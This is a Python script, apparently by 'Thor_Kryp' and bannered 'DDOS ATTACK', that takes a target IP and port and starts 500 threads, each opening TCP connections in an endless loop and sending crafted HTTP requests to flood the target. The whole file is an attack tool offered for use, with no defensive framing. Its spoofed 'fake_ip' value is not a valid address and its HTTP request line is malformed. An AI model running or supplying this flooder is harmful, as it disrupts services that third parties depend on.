import socket
import threading
from rich.console import Console
console = Console()

console.print(''' 
____________ _____ _____    ___ _____ _____ ___  _____  _   __
|  _  \  _  \  _  /  ___|  / _ \_   _|_   _/ _ \/  __ \| | / /
| | | | | | | | | \ `--.  / /_\ \| |   | |/ /_\ \ /  \/| |/ / 
| | | | | | | | | |`--. \ |  _  || |   | ||  _  | |    |    \ 
| |/ /| |/ /\ \_/ /\__/ / | | | || |   | || | | | \__/\| |\  |
|___/ |___/  \___/\____/  \_| |_/\_/   \_/\_| |_/\____/\_| \_/                                                                                                                    
''',style="#f700f3 bold")
print('='*30)
console.print("[#e100ff]Author[/]  : [#00fff6]Thor_Kryp[/]")
print('='*30)

target = input( 'Target/IP : => ')
fake_ip = '503.042.320.222'
port = int(input('Port : => '))
print('='*30)
times_connected = 0

def dos():
    while True:
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.connect((target, port))
            server.sendto(("GET / "+ target +" HTTP/1.1\r\n").encode('ascii'), (target, port))
            server.sendto(("Host: " + fake_ip + " HTTP/1.1\r\n\r\n").encode('ascii'), (target, port))
            server.close()
        except:
            continue

        global times_connected
        times_connected += 1

        if times_connected % 500 == 0:
            print(f'Enviando pacotes {times_connected}' )

for i in range(500):
    thread = threading.Thread(target=dos)
    thread.start()
